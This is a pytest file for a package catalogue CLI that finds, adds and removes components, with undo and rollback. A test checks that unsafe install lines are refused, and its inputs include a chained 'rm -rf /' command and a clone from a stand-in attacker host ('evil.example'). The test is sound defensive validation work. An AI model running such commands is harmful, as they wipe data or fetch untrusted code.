"""`aither find | add | remove`: one row for every source, and every add can be undone.

Runs the real resolver and the real add/remove code over the shipped snapshot
(``adk/data/catalogue.json``) with a recording runner in place of the subprocess call,
so nothing is installed on the machine that runs the tests.
"""
from __future__ import annotations

import json

import pytest

from adk import catalog
from adk import catalog_person as person


@pytest.fixture()
def rows(monkeypatch, tmp_path):
    """The snapshot rows, as a pip-installed awdk on Windows would read them."""
    monkeypatch.setenv("AITHER_CATALOGUE_OS", "windows")
    monkeypatch.setenv("AITHER_ADDON_LOCK", str(tmp_path / "addons.lock.json"))
    monkeypatch.setenv("AITHER_CATALOGUE_SRC", str(tmp_path / "src"))
    doc = json.loads(person.SNAPSHOT.read_text(encoding="utf-8"))
    return [person._row(**r) for r in doc["entries"]]


class Recorder:
    def __init__(self, fail_on: str = ""):
        self.calls: list = []
        self.fail_on = fail_on

    def __call__(self, argv):
        self.calls.append(list(argv))
        if self.fail_on and self.fail_on in " ".join(argv):
            return 1, "simulated failure"
        return 0, ""


def test_snapshot_rows_carry_every_person_field(rows):
    assert len(rows) > 150
    for r in rows:
        for key in person.PERSON_ROW:
            assert key in r, (r["id"], key)
        assert r["kind"] in person.KINDS
        assert len(r["what"]) >= 12, r["id"]


# ── the owner's example: a new user wants "hearth" and "sprite" ─────────────────────

@pytest.mark.parametrize("word,expected", [
    ("hearth", "agent-home-kit"), ("sprite", "awsprite"), ("awnode", "awnode"),
    ("aitherzero", "AitherZero"), ("omnishell", "awsh"), ("tunnel", "awtunnel"),
    ("skill:repo-intake", "skill:repo-intake"), ("awdesk", "awdesk"),
    ("powertoys", "powertoys"),
])
def test_one_word_resolves_to_one_entry(rows, word, expected):
    row, candidates = person.resolve(word, rows)
    assert row is not None, [c["id"] for c in candidates]
    assert row["id"] == expected


def test_find_puts_the_thing_first_and_says_what_to_do_next(rows):
    for word, top in (("hearth", "agent-home-kit"), ("sprite", "awsprite")):
        res = person.find_entries(word, rows=rows)
        assert res["items"][0]["id"] == top
        text = person.render_find(res)
        assert text.splitlines()[0].startswith("Next: ")


def test_find_caps_at_five_and_reports_the_real_total(rows):
    res = person.find_entries("", rows=rows)
    assert len(res["items"]) == 5
    assert res["total"] == len(rows)
    assert res["more"] == len(rows) - 5
    text = person.render_find(res)
    assert f"+{res['more']} more" in text
    assert f"{res['total']} matches" in text
    everything = person.find_entries("", rows=rows, limit=100000)
    assert len(everything["items"]) == res["total"] and everything["more"] == 0


def test_a_bare_find_leads_with_what_the_bare_install_left_out(rows):
    ids = [i["id"] for i in person.find_entries("", rows=rows)["items"]]
    assert set(ids) <= {c["id"] for c in person.INSTALLER_COMPONENTS}


@pytest.mark.parametrize("ref,argv_part,undo_part", [
    ("sprite", "pip install awsprite", "pip uninstall -y awsprite"),
    ("awnode", "pip install awnode", "pip uninstall -y awnode"),
    ("skill:repo-intake", "adk skills install repo-intake", "adk skills remove repo-intake"),
    ("powertoys", "winget install -e --id Microsoft.PowerToys",
     "winget uninstall -e --id Microsoft.PowerToys"),
])
def test_add_then_remove_runs_the_step_and_its_undo(rows, ref, argv_part, undo_part):
    run = Recorder()
    added = person.add_entry(ref, runner=run, rows=rows)
    assert added["ok"], added
    assert argv_part.split(" ", 1)[1] in " ".join(run.calls[-1])
    assert added["did"] and added["undo"].startswith("aither remove ")
    text = person.render_result(added, "add")
    assert "See it: " in text and "Undo: " in text and text.splitlines()[-1].startswith("Next: ")
    assert person.is_installed(person.resolve(ref, rows)[0])

    removed = person.remove_entry(ref, runner=run, rows=rows)
    assert removed["ok"], removed
    assert undo_part.split(" ", 1)[1] in " ".join(run.calls[-1])
    from adk.addon_lock import lookup
    assert lookup(added["id"], "catalogue") is None


def test_aitherzero_clones_into_the_catalogue_folder_and_remove_deletes_only_that(rows, tmp_path):
    run = Recorder()
    added = person.add_entry("AitherZero", runner=run, rows=rows)
    assert added["ok"]
    argv = run.calls[-1]
    assert argv[1:4] == ["clone", "--depth", "1"]
    assert argv[4] == "https://github.com/Aitherium/AitherZero"
    target = tmp_path / "src" / "AitherZero"
    assert argv[5].replace("\\", "/") == str(target).replace("\\", "/")
    target.mkdir(parents=True)
    (target / "f.txt").write_text("x", encoding="utf-8")
    outside = tmp_path / "keep"
    outside.mkdir()
    removed = person.remove_entry("AitherZero", runner=run, rows=rows)
    assert removed["ok"] and not target.exists() and outside.exists()
    person._rmtree(str(outside))          # a path outside the catalogue folder is refused
    assert outside.exists()


def test_hearth_sets_up_the_free_part_and_names_the_purchase(rows):
    run = Recorder()
    res = person.add_entry("hearth", runner=run, rows=rows)
    assert res["ok"]
    assert [" ".join(c[1:]) for c in run.calls] == ["-m adk home init"]
    assert "https://shop.aitherium.com/shop/agent-home-kit" in res["next"]
    assert "$19.00 once" in res["next"]
    assert res["see"] == "adk home status"
    assert any("adk home signin" in s for s in res["steps_after"])


def test_a_paid_product_with_no_setup_only_points_at_its_page(rows):
    run = Recorder()
    res = person.add_entry("saga-lifetime", runner=run, rows=rows)
    assert res["ok"] and run.calls == []
    assert res["next"].startswith("Buy it ($29.00 once): https://shop.aitherium.com/shop/")
    from adk.addon_lock import lookup
    assert lookup("saga-lifetime", "catalogue") is None     # nothing installed, nothing recorded


def test_a_failed_step_undoes_what_already_ran(rows):
    run = Recorder(fail_on="install awm")
    res = person.add_entry("personal-agent-home", runner=run, rows=rows)
    assert not res["ok"] and "1 step failed" in res["detail"]
    joined = [" ".join(c) for c in run.calls]
    assert any("pip install awsprite" in c for c in joined)
    assert any("pip uninstall -y awsprite" in c for c in joined)
    assert not any("uninstall -y awdk" in c for c in joined)


def test_a_stack_never_installs_or_removes_the_start_console(rows):
    row, _ = person.resolve("personal-agent-home", rows)
    flat = [" ".join(s) for s in row["add_steps"] + row["remove_steps"]]
    assert not any(s.endswith(" awdk") or "@aitherium/awsh" in s for s in flat)


def test_the_start_console_cannot_be_removed(rows):
    for core in person.CORE_IDS:
        res = person.remove_entry(core, runner=Recorder(), rows=rows)
        assert not res["ok"] and "stays" in res["detail"]


def test_listed_entries_say_why_and_do_not_run(rows):
    run = Recorder()
    res = person.add_entry("awnix", runner=run, rows=rows)
    assert not res["ok"] and "cannot be added yet" in res["detail"] and run.calls == []


def test_an_integration_with_no_line_for_this_os_is_listed_not_guessed(monkeypatch, rows):
    monkeypatch.setenv("AITHER_CATALOGUE_OS", "linux")
    doc = json.loads(person.SNAPSHOT.read_text(encoding="utf-8"))
    row = person._row(**next(e for e in doc["entries"] if e["id"] == "powertoys"))
    assert row["status"] == "listed" and row["add"] == "" and row["gap"]


def test_unknown_word_points_at_find(rows):
    res = person.add_entry("no-such-thing-xyz", runner=Recorder(), rows=rows)
    assert not res["ok"] and res["next"] == "aither find no-such-thing-xyz"


def test_dry_run_runs_nothing_and_records_nothing(rows):
    run = Recorder()
    res = person.add_entry("awtunnel", dry_run=True, runner=run, rows=rows)
    assert res["ok"] and run.calls == [] and res["did"] == ["pip install awtunnel"]
    assert not person.is_installed({"id": "zz-not-here", "add_steps": [], "detect": []})


@pytest.mark.parametrize("line,head", [
    ("pip install awnode", "pip"), ("npm i -g @aitherium/awsh", "npm"),
    ("git clone https://github.com/Aitherium/awkit", "git"),
    ("winget install Microsoft.PowerShell", "winget"),
    ("https://mediaforge.aitherium.com", "open"),
])
def test_install_lines_with_a_known_undo_parse(line, head):
    add, _undo, why = person.parse_install_line(line)
    assert add and add[0][0] == head and why == ""


@pytest.mark.parametrize("line", [
    "podman build -t awnix:latest -f Containerfile .", "pip install a && rm -rf /",
    "pip install git+https://github.com/x/y", "git clone https://evil.example/x", "",
])
def test_install_lines_without_a_known_undo_are_refused(line):
    add, undo, why = person.parse_install_line(line)
    assert add == [] and undo == [] and why


def test_cli_find_json_shape(capsys, rows, monkeypatch):
    monkeypatch.setattr(person, "load_rows", lambda: rows)
    assert catalog.cli_main(["find", "hearth", "--json"]) == 0
    out = json.loads(capsys.readouterr().out)
    assert set(out) >= {"items", "more", "total", "next"}
    assert out["items"][0]["id"] == "agent-home-kit"
    assert catalog.cli_main(["add", "awtunnel", "--dry-run"]) == 0
    assert "pip install awtunnel" in capsys.readouterr().out


def test_without_a_source_tree_the_shipped_snapshot_answers(monkeypatch):
    """A pip-installed awdk has no registry files: find still works from the snapshot."""
    monkeypatch.setattr(person, "_ecosystem", lambda: {})
    loaded = person.load_rows()
    ids = {r["id"] for r in loaded}
    assert {"agent-home-kit", "awsprite", "awnode", "AitherZero", "awdesk"} <= ids
    assert person.find_entries("sprite", rows=loaded)["items"][0]["id"] == "awsprite"
